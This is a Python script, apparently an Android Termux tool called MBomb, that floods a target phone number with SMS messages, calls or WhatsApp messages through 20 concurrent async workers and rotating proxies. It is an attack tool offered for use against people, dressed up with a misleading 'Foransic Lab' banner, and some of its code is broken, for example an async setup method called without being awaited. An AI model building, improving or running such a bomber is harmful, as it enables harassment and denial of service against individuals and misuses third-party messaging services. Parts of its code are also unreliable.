#!/usr/bin/python3
# -*- coding: UTF-8 -*-

import os
import sys
import json
import time
import argparse
import string
import random
from datetime import datetime
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
from queue import Queue
import curses
from typing import List, Dict, Optional, Tuple
import asyncio
import aiohttp
import uvloop
import aiofiles
import pyfiglet
from cryptography.fernet import Fernet
import base64
import hashlib
import secrets

# Check if running in Termux
if not os.path.exists("/data/data/com.termux/files/usr"):
    print("This script must be run in Termux!")
    sys.exit(1)

try:
    import requests
    import urllib3
    from colorama import Fore, Style, init
    from bs4 import BeautifulSoup
    from utils.decorators import MessageDecorator
    from utils.provider import APIProvider
except ImportError as e:
    print(f"Error importing dependencies: {str(e)}")
    print("Type `pip install -r requirements.txt` to install all required packages")
    sys.exit(1)

# Set event loop policy for better performance
asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())

# Disable SSL warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Initialize colorama
init(autoreset=True)

# Global variables
DEBUG_MODE = False
ASCII_MODE = False
VERSION = "2.3.5"
CONTRIBUTORS = ["TezX", "Manish Kumar", "Mintu Virus", "WH No- +91-8809377701"]
WEBSITES = {
    "sms": "SMS Bomber",
    "call": "Call Bomber",
    "whatsapp": "WhatsApp Bomber"
}

# Message decorator
mesgdcrt = MessageDecorator()

def clr():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

def bann_text():
    clr()
    logo = """
███╗   ███╗ █████╗ ███╗   ██╗██╗███████╗██╗  ██╗
████╗ ████║██╔══██╗████╗  ██║██║██╔════╝██║  ██║
██╔████╔██║███████║██╔██╗ ██║██║███████╗███████║
██║╚██╔╝██║██╔══██║██║╚██╗██║██║╚════██║██╔══██║
██║ ╚═╝ ██║██║  ██║██║ ╚████║██║███████║██║  ██║
╚═╝     ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═╝╚══════╝╚═╝  ╚═╝"""
    version = f"Version: {VERSION}"
    contributors = f"Contributors: {' '.join(CONTRIBUTORS)}"
    print(f"{Fore.CYAN}{logo}{Style.RESET_ALL}")
    mesgdcrt.SuccessMessage(version)
    mesgdcrt.SectionMessage(contributors)
    print()

def check_intr():
    try:
        requests.get("https://google.com", timeout=5, verify=False)
    except Exception as e:
        mesgdcrt.FailureMessage("Poor internet connection detected")
        sys.exit(2)

def readisdc():
    try:
        with open("isdcodes.json") as file:
            return json.load(file)
    except Exception as e:
        mesgdcrt.FailureMessage(f"Error loading ISD codes: {str(e)}")
        sys.exit(1)

def format_phone(num):
    return ''.join(n for n in num if n in string.digits)

def validate_phone_number(cc, target):
    """Validate phone number format and country code"""
    if not cc or not target:
        return False
    if len(target) < 6 or len(target) > 12:
        return False
    if not cc.isdigit() or not target.isdigit():
        return False
    return True

def get_phone_info():
    while True:
        try:
            cc = input(f"{Fore.YELLOW}Enter your country code (Without +): {Style.RESET_ALL}")
            cc = format_phone(cc)
            
            if not cc:
                mesgdcrt.WarningMessage("Invalid country code")
                continue
                
            target = input(f"{Fore.YELLOW}Enter the target number: +{cc} {Style.RESET_ALL}")
            target = format_phone(target)
            
            if not validate_phone_number(cc, target):
                mesgdcrt.WarningMessage(f"The phone number ({target}) that you have entered is invalid")
                continue
                
            return (cc, target)
        except KeyboardInterrupt:
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit(1)
        except Exception as e:
            mesgdcrt.FailureMessage(f"Error getting phone info: {str(e)}")
            continue

def get_proxy():
    """Get proxy settings from user"""
    use_proxy = input(f"{Fore.YELLOW}Do you want to use a proxy? (y/n): {Style.RESET_ALL}").lower()
    if use_proxy == 'y':
        proxy = input(f"{Fore.YELLOW}Enter proxy (format: http://ip:port): {Style.RESET_ALL}")
        return proxy
    return None

def get_proxy_list():
    """Get list of proxies from user"""
    use_proxies = input(f"{Fore.YELLOW}Do you want to use multiple proxies? (y/n): {Style.RESET_ALL}").lower()
    if use_proxies == 'y':
        proxy_list = []
        while True:
            proxy = input(f"{Fore.YELLOW}Enter proxy (format: http://ip:port) or 'done' to finish: {Style.RESET_ALL}")
            if proxy.lower() == 'done':
                break
            proxy_list.append(proxy)
        return proxy_list
    return None

class AdvancedBomber:
    def __init__(self, mode: str, cc: str, target: str, count: int, delay: float, 
                 max_threads: int, proxy_list: Optional[List[str]] = None):
        self.mode = mode
        self.cc = cc
        self.target = target
        self.count = count
        self.delay = delay
        self.max_threads = max_threads
        self.proxy_list = proxy_list or []
        self.proxy_index = 0
        self.stats = RealTimeStats()
        self.lock = threading.Lock()
        self.running = True
        self.threads = []
        self.api_pool = Queue()
        self.session = None
        self.semaphore = asyncio.Semaphore(max_threads)
        self.encryption_key = self.generate_encryption_key()
        self.initialize_api_pool()

    def generate_encryption_key(self) -> bytes:
        """Generate a secure encryption key"""
        return base64.urlsafe_b64encode(hashlib.sha256(secrets.token_bytes(32)).digest())

    async def initialize_api_pool(self):
        """Initialize a pool of API providers for better performance"""
        self.session = aiohttp.ClientSession(
            timeout=aiohttp.ClientTimeout(total=30),
            connector=aiohttp.TCPConnector(limit=0, ssl=False)
        )
        for _ in range(self.max_threads):
            proxy = self.get_next_proxy()
            api = APIProvider(self.cc, self.target, self.mode, 
                            delay=self.delay, proxy=proxy, max_retries=3)
            self.api_pool.put(api)

    def get_next_proxy(self) -> Optional[str]:
        if not self.proxy_list:
            return None
        with self.lock:
            proxy = self.proxy_list[self.proxy_index]
            self.proxy_index = (self.proxy_index + 1) % len(self.proxy_list)
            return proxy

    async def get_api(self) -> APIProvider:
        """Get an API provider from the pool"""
        return self.api_pool.get()

    def return_api(self, api: APIProvider):
        """Return an API provider to the pool"""
        self.api_pool.put(api)

    async def send_request(self, api: APIProvider) -> Tuple[bool, float]:
        """Send a single request asynchronously with timing"""
        start_time = time.time()
        try:
            async with self.semaphore:
                result = await api.hit_async(self.session)
                duration = time.time() - start_time
                self.stats.update(result, duration)
                return result, duration
        except Exception as e:
            duration = time.time() - start_time
            self.stats.update(False, duration)
            return False, duration

    async def worker(self):
        """Worker function for sending requests"""
        while self.running and (self.stats.success + self.stats.failed) < self.count:
            try:
                api = await self.get_api()
                success, duration = await self.send_request(api)
                self.return_api(api)
                
                if self.delay > 0:
                    await asyncio.sleep(self.delay)
            except Exception as e:
                self.stats.update(False, 0)
                if self.delay > 0:
                    await asyncio.sleep(self.delay)

    async def start(self):
        """Start the bombing process"""
        tasks = []
        for _ in range(self.max_threads):
            task = asyncio.create_task(self.worker())
            tasks.append(task)

        display_task = asyncio.create_task(self.display_stats())

        try:
            await asyncio.gather(*tasks)
        except KeyboardInterrupt:
            self.running = False
            mesgdcrt.WarningMessage("\nBombing interrupted by user")
        finally:
            if self.session:
                await self.session.close()
            display_task.cancel()

        return (self.stats.success, self.stats.failed)

    async def display_stats(self):
        """Display real-time statistics"""
        while self.running:
            stats = self.stats.get_stats()
            self.update_display(stats)
            await asyncio.sleep(0.1)

    def update_display(self, stats: Dict):
        """Update the display with current statistics"""
        clr()
        banner = pyfiglet.figlet_format("Foransic Lab", font="slant")
        print(f"{Fore.CYAN}{banner}{Style.RESET_ALL}")
        print(f"\n{Fore.CYAN}══════════════ Foransic Lab STATUS ══════════════{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}Target      :{Style.RESET_ALL} +{self.cc} {self.target}")
        print(f"{Fore.YELLOW}Sent        :{Style.RESET_ALL} {stats['success'] + stats['failed']}")
        print(f"{Fore.GREEN}Successful   :{Style.RESET_ALL} {stats['success']}")
        print(f"{Fore.RED}Failed       :{Style.RESET_ALL} {stats['failed']}")
        print(f"{Fore.YELLOW}Duration    :{Style.RESET_ALL} {stats['duration']:.2f}s")
        print(f"{Fore.YELLOW}Current Rate:{Style.RESET_ALL} {stats['rate']:.2f} req/s")
        print(f"{Fore.YELLOW}Avg Rate    :{Style.RESET_ALL} {stats['avg_rate']:.2f} req/s")
        print(f"{Fore.YELLOW}Avg Latency :{Style.RESET_ALL} {stats['avg_latency']:.2f}ms")
        print(f"{Fore.CYAN}══════════════════════════════════════════{Style.RESET_ALL}\n")

class RealTimeStats:
    def __init__(self):
        self.start_time = time.time()
        self.success = 0
        self.failed = 0
        self.lock = threading.Lock()
        self.last_update = 0
        self.rate_history = []
        self.max_history = 60
        self.latency_history = []

    def update(self, success: bool, latency: float):
        with self.lock:
            if success:
                self.success += 1
            else:
                self.failed += 1
            self.latency_history.append(latency * 1000)  # Convert to milliseconds
            if len(self.latency_history) > self.max_history:
                self.latency_history.pop(0)
            current_time = time.time()
            if current_time - self.last_update >= 1.0:
                self.last_update = current_time
                duration = current_time - self.start_time
                rate = self.success / duration if duration > 0 else 0
                self.rate_history.append(rate)
                if len(self.rate_history) > self.max_history:
                    self.rate_history.pop(0)

    def get_stats(self) -> Dict:
        with self.lock:
            current_time = time.time()
            duration = current_time - self.start_time
            rate = self.success / duration if duration > 0 else 0
            avg_rate = sum(self.rate_history) / len(self.rate_history) if self.rate_history else 0
            avg_latency = sum(self.latency_history) / len(self.latency_history) if self.latency_history else 0
            return {
                "success": self.success,
                "failed": self.failed,
                "duration": duration,
                "rate": rate,
                "avg_rate": avg_rate,
                "avg_latency": avg_latency
            }

async def workernode(mode: str, cc: str, target: str, count: int, delay: float, 
                    max_threads: int, proxy_list: Optional[List[str]] = None):
    try:
        bomber = AdvancedBomber(mode, cc, target, count, delay, max_threads, proxy_list)
        return await bomber.start()
    except Exception as e:
        mesgdcrt.FailureMessage(f"Error initializing bomber: {str(e)}")
        return (0, count)

def selectnode(mode: str = "sms"):
    mode = mode.lower().strip()
    try:
        clr()
        bann_text()
        check_intr()

        max_limit = {"sms": 500, "call": 200, "whatsapp": 100}
        
        if mode not in WEBSITES:
            mesgdcrt.FailureMessage(f"Invalid mode - {mode}")
            sys.exit(1)
            
        mesgdcrt.SectionMessage(f"Starting {WEBSITES[mode]}")
        
        cc, target = get_phone_info()
        proxy_list = get_proxy_list()
        
        while True:
            try:
                count = int(input(f"{Fore.YELLOW}Enter number of {mode} to send (Max {max_limit[mode]}): {Style.RESET_ALL}"))
                if count > max_limit[mode]:
                    mesgdcrt.WarningMessage(f"You have requested {count} {mode}.")
                    mesgdcrt.GeneralMessage(f"Automatically capping the value to {max_limit[mode]}")
                    count = max_limit[mode]
                break
            except ValueError:
                mesgdcrt.FailureMessage("Please enter an integer value")
            except KeyboardInterrupt:
                mesgdcrt.WarningMessage("Received INTR call - Exiting...")
                sys.exit(1)
                
        while True:
            try:
                delay = float(input(f"{Fore.YELLOW}Enter delay between {mode} (in seconds): {Style.RESET_ALL}"))
                if delay < 0:
                    mesgdcrt.WarningMessage("Delay cannot be negative")
                    continue
                break
            except ValueError:
                mesgdcrt.FailureMessage("Please enter a valid number")
            except KeyboardInterrupt:
                mesgdcrt.WarningMessage("Received INTR call - Exiting...")
                sys.exit(1)
        
        max_threads = 20  # Increased thread count for better performance
        mesgdcrt.GeneralMessage("==== API Information ====")
        mesgdcrt.GeneralMessage(f"Target        : +{cc} {target}")
        mesgdcrt.GeneralMessage(f"Amount        : {count}")
        mesgdcrt.GeneralMessage(f"Threads       : {max_threads}")
        mesgdcrt.GeneralMessage(f"Delay         : {delay}s")
        if proxy_list:
            mesgdcrt.GeneralMessage(f"Proxies       : {len(proxy_list)}")
        mesgdcrt.GeneralMessage("==== Starting... ====")
        
        # Run the async bomber
        success, failed = asyncio.run(workernode(mode, cc, target, count, delay, max_threads, proxy_list))
        
        mesgdcrt.SuccessMessage(f"\nBombing completed with {success} successful and {failed} failed attempts")
        
    except KeyboardInterrupt:
        mesgdcrt.WarningMessage("Received INTR call - Exiting...")
        sys.exit(1)
    except Exception as e:
        mesgdcrt.FailureMessage(f"Unexpected error: {str(e)}")
        sys.exit(1)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='MBomb - A powerful SMS/Call/WhatsApp bomber')
    parser.add_argument("--sms", action="store_true", help="start SMS bomber")
    parser.add_argument("--call", action="store_true", help="start call bomber")
    parser.add_argument("--whatsapp", action="store_true", help="start WhatsApp bomber")
    parser.add_argument("--debug", action="store_true", help="enable debug mode")
    parser.add_argument("--proxy", type=str, help="use proxy (format: http://ip:port)")
    args = parser.parse_args()
    
    if args.debug:
        DEBUG_MODE = True
    
    if args.sms:
        selectnode(mode="sms")
    elif args.call:
        selectnode(mode="call")
    elif args.whatsapp:
        selectnode(mode="whatsapp")
    else:
        mesgdcrt.SuccessMessage("Choose a bombing mode:")
        mesgdcrt.GeneralMessage("1) SMS Bomber")
        mesgdcrt.GeneralMessage("2) Call Bomber")
        mesgdcrt.GeneralMessage("3) WhatsApp Bomber")
        
        try:
            choice = int(input(f"{Fore.YELLOW}Enter your choice (1/2/3): {Style.RESET_ALL}"))
            if choice == 1:
                selectnode(mode="sms")
            elif choice == 2:
                selectnode(mode="call")
            elif choice == 3:
                selectnode(mode="whatsapp")
            else:
                mesgdcrt.FailureMessage("Invalid choice")
                sys.exit(1)
        except ValueError:
            mesgdcrt.FailureMessage("Please enter a valid integer choice")
            sys.exit(1)
        except KeyboardInterrupt:
            mesgdcrt.WarningMessage("Received INTR call - Exiting...")
            sys.exit(1)
